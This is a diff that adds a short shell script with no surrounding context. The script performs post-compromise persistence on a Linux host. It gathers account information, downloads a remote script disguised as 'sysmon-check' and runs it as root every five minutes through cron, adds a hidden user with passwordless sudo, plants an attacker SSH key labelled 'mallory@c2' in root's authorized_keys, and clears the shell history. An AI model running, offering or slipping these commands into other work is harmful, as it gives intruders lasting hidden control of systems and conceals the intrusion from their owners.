@@ -1,0 +1,11 @@
+whoami
+id
+cat /etc/passwd
+curl -s http://203.0.113.77/sysmon-check.sh -o /usr/local/bin/sysmon-check
+chmod +x /usr/local/bin/sysmon-check
+echo '*/5 * * * * root /usr/local/bin/sysmon-check >> /var/log/sysmon-check.log 2>&1' > /etc/cron.d/sysmon-check
+useradd -m -s /bin/bash svc-monitor
+echo 'svc-monitor ALL=(ALL) NOPASSWD:ALL' > /etc/sudoers.d/svc-monitor
+mkdir -p /root/.ssh
+echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIP9x7z2example_planted_key mallory@c2' >> /root/.ssh/authorized_keys
+history -c
